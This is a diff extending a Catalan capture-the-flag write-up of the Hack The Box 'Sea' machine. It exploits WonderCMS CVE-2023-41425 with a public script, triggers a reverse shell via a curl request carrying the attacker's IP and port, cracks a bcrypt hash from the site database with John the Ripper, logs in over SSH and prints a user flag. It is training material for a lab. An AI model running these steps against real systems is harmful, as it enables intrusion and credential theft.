@@ -1,5 +1,3 @@
-Actualment està en progrés
-
 
 El primer que farem serà un nmap a la màquina que estem atacant:
 ``nmap -sC -sV -v 10.10.11.28``
@@ -346,3 +344,279 @@ LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duratio
 ```
 
 Hem trobat alguns directoris dins el directori /themes/bike, penso que per aquí al ser una web sobre competicions de bicis hem d'anar bé ja que portem molta estona i encara no hem trobat res. Enviaré la petició al repeater del Burpsuite així podré manipular-la des d'allà i veure la resposta.
+
+Bé, després de gastar molt i molt de temps cercant, enumerant fitxers bàsics a mà dins dels directoris dins dels directoris que hem trobat, ens topem que a dins el directori /themes/bike/README.md hi veiem el text següent:
+
+![[Pasted image 20240817182817.png]]
+
+```
+# WonderCMS bike theme
+
+## Description
+Includes animations.
+
+## Author: turboblack
+
+## Preview
+![Theme preview](/preview.jpg)
+
+## How to use
+1. Login to your WonderCMS website.
+2. Click "Settings" and click "Themes".
+3. Find theme in the list and click "install".
+4. In the "General" tab, select theme to activate it.`
+```
+
+Hem cercat WonderCMS al navegador i trobem que WonderCMS es posiciona com un sistema de gestió de continguts de codi obert totalment gratuït. Un cop vist què és aquest WinderCMS, cercarem a veure si trobem algun exploit o POC a internet:
+
+![[Pasted image 20240817183053.png]]
+
+De fet, només posar wondercms al navegador ja ens apareix com a segona cerca exploit i com a quarta default password. Primer cercaré l'exploit, a veure si tenim èxit. Vaig al prime de GitHub que trobo:
+
+![[Pasted image 20240817183417.png]]
+
+
+https://github.com/prodigiousMind/CVE-2023-41425 
+
+La descripció de l'exploit diu que: 
+
+La vulnerabilitat de Cross Site Scripting a Wonder CMS v.3.2.0 a v.3.4.2 permet que un atacant remot executi codi arbitrari mitjançant un script dissenyat penjat al component installModule.
+
+Per tant, a veure si fem sort i ens trobem davant una versió de Wonder CMS compatible amb aquest exploit. El repositori inclou amb captures de pantalla el POC, per tant anem a provar a veure si ens funciona. Aquest exploit és per el CVE-2023-41425 i funciona de la següent manera segons el pròpi repositori de GitHub:
+
+L'exploit adjunt "exploit.py" realitza les següents accions:
+
+1. Pren 3 arguments:
+    - URL: on està instal·lat WonderCMS (no cal conèixer la contrasenya)
+    - IP: la IP de la màquina de l'atacant
+    - Núm. de port: el port de la màquina de l'atacant
+2. Genera un fitxer xss.js (per a XSS reflectit) i mostra un enllaç maliciós.
+3. Tan bon punt l'admin (usuari amb sessió iniciada) obre/clica l'enllaç maliciós, es realitzen unes quantes peticions en segon pla sense que l'admin ho noti per pujar una shell mitjançant la funcionalitat de pujar temes/complements.
+4. Després de pujar la shell, s'executa la shell i l'atacant obté la connexió inversa del servidor.
+
+Primer de tot descarreguem l'script fet amb python del repositori i li donem permisos d'execució:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali]
+└─# cd Documents/Sea      
+
+┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
+└─# ls
+exploit.py
+  
+┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
+└─# chmod u+x exploit.py `
+```
+
+Un cop fet això, hem d'executar l'exploit.py, posant la url, la nostre IP i el port per el qual escoltarem:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
+└─# python3 exploit.py http://sea.htb/themes 10.10.14.106 4444  
+``` 
+
+I en un altre terminal escoltar per el port 4444 que és el que hem posat al executar l'exploit.py:
+
+```
+┌──(polkali㉿kaliPol)-[~]
+└─$ nc -nlvp 4444 
+listening on [any] 4444 ...
+```
+
+A més a més, des d'un altre terminal hem de llençar la comanda següent, amb url, la nostre IP i el port per on estem escoltant. Hem de desencadenar el fitxer rev.php per establir la connexió del servidor objectiu amb la nostra màquina. Això ho podem saber revisant l'script exploit.py ja que hi ha una línia que es menciona diverses vegades en el codi (“GET”, urlWithoutLogBase + “/themes/revshell-main/rev.php”)
+
+``curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.106&lport=4444'``
+
+I ara veiem que des del port que estàvem escoltant estem dins la màquina que estem atacant amb l'usuari www-data:
+
+```
+┌──(polkali㉿kaliPol)-[~]
+└─$ nc -nlvp 4444                                                                                                      
+listening on [any] 4444 ...
+connect to [10.10.14.185] from (UNKNOWN) [10.10.11.28] 51934
+Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 19:32:03 up  1:41,  1 user,  load average: 0.00, 0.02, 1.44
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami 
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+```
+
+Ara, haurem de cercar a veure si trobem credencials d'algun usuari per poder connectar-nos a través de ssh ja que la màquina víctima té el port 22 amb el servei ssh obert. Al home veiem que hi ha dos usuaris, però amb cap dels dos podem fer res, amb amay no podem obrir el fitxer que hi ha al home i amb geo no podem accedir al seu home:
+
+```
+$ cd home
+$ ls
+amay
+geo
+$ cd amay
+$ ls
+user.txt
+$ cat user.txt
+cat: user.txt: Permission denied
+$ cd ..
+$ cd geo
+/bin/sh: 12: cd: can't cd to geo
+$ 
+```
+
+Per tant, toca fer una cerca en profunditat pels directoris i fitxers del servidor web/màquina víctima. Després de donar moltes voltes, trobo aquest fitxer, que per el nom era molt prometedor, i efectivament, hi ha la contrasenya en hash  que deu ser d'un dels dos usuaris que hem trobat que tenen home:
+
+```
+$ cat /var/www/sea/data/database.js   
+{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "defaultPage": "home",
+        "login": "loginURL",
+        "forceLogout": false,
+        "forceHttps": false,
+        "saveChangesPopup": true,
+        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
+        "lastLogins": {
+            "2024\/08\/21 18:47:27": "127.0.0.1",
+            "2024\/08\/21 18:37:56": "127.0.0.1",
+            "2024\/08\/21 18:35:26": "127.0.0.1",
+            "2024\/08\/21 18:27:56": "127.0.0.1",
+            "2024\/08\/21 18:19:25": "127.0.0.1"
+        },
+        "lastModulesSync": "2024\/08\/21",
+        "customModules": {
+            "themes": {
+                "0": "http:\/\/10.10.14.96:8000\/wcms-modules.json"
+            },
+            "plugins": {}
+        },
+        "menuItems": {
+            "0": {
+                "name": "Home",
+                "slug": "home",
+                "visibility": "show",
+                "subpages": {}
+            },
+            "1": {
+                "name": "How to participate",
+                "slug": "how-to-participate",
+                "visibility": "show",
+                "subpages": {}
+            }
+        },
+        "logoutToLoginScreen": {}
+    },
+    "pages": {
+        "404": {
+            "title": "404",
+            "keywords": "404",
+            "description": "404",
+            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
+            "subpages": {}
+        },
+        "home": {
+            "title": "Home",
+            "keywords": "Enter, page, keywords, for, search, engines",
+            "description": "A page description is also good for search engines.",
+            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
+            "subpages": {}
+        },
+        "how-to-participate": {
+            "title": "How to",
+            "keywords": "Enter, keywords, for, this page",
+            "description": "A page description is also good for search engines.",
+            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
+            "subpages": {}
+        }
+    },
+    "blocks": {
+        "subside": {
+            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
+        },
+        "footer": {
+            "content": "©2024 Sea"
+        }
+    }
+}$ `
+```
+
+
+Ara, el primer de tot és veure quin tipus de hash és, a veure si el podem "trencar". Primer de tot he anat a la web següent per veure el tipus de hash que és:
+
+https://hashes.com/en/decrypt/hash
+
+I veiem com ens diu el següent:
+
+![[Pasted image 20240821215139.png]]
+
+Ara amb Jhon the ripper mirarem de "trencar" o crackejar el hash. El primer format que ens suggereix és el bcrypt per tant és el primer que provarem. Per començar ho provarem amb la llista més popular, la rockyou.txt. Abans però, desarem el hash a un fitxer per poder crackejar-lo:
+
+![[Pasted image 20240821215517.png]]
+
+``john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt``
+
+Després de diverses proves i assaig error i força temps perdut sense èxit, veig que el hash té ``\/`` i s'han d'eliminar les ``\``.
+
+Ara sí, tornem a executar la comanda utilitzant John the ripper i tenim èxit, al cap d'uns segons obtenim la contrasenya:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
+└─# john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mychemicalromance (?)     
+1g 0:00:00:26 DONE (2024-08-21 22:04) 0.03792g/s 116.7p/s 116.7c/s 116.7C/s osiris..milena
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Ara, ens queda provar la connexió per ssh i veure si és la password de l'usuari amay o geo. Primer provem amb amay i tenim èxit:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
+└─# ssh amay@10.10.11.28   
+The authenticity of host '10.10.11.28 (10.10.11.28)' can't be established.
+ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes`
+```
+
+Efectivament estem amb l'usuari amay:
+
+```
+amay@sea:~$ whoami
+amay
+amay@sea:~$ id
+uid=1000(amay) gid=1000(amay) groups=1000(amay)
+amay@sea:~$ `
+```
+
+Ara, anirem al home on com sempre a HTB hi trobarem la flag dins el fitxer user.txt:
+
+```
+amay@sea:~$ pwd
+/home/amay
+amay@sea:~$ ls
+user.txt
+amay@sea:~$ cat user.txt 
+d36b9e6bf7d8cf3b643ca4668293d1a8`
+```
+
+I ja tenim la User Flag. Ara, haurem de mirar com escalar privilegis dins el servidor per obtenir la flag de l'usuari root.
+
+Primer de tot provem amb sudo -l per veure què podem executar com a sudoers amb l'usuari amay, però no tenim èxit ja que ens demana contrasenya que no tenim:
+
+```
+amay@sea:~$ sudo -l
+[sudo] password for amay:                                                                                                                     
+Sorry, try again.                                                                           
+[sudo] password for amay:                                                                 
+Sorry, user amay may not run sudo on sea. 
+```
+
+
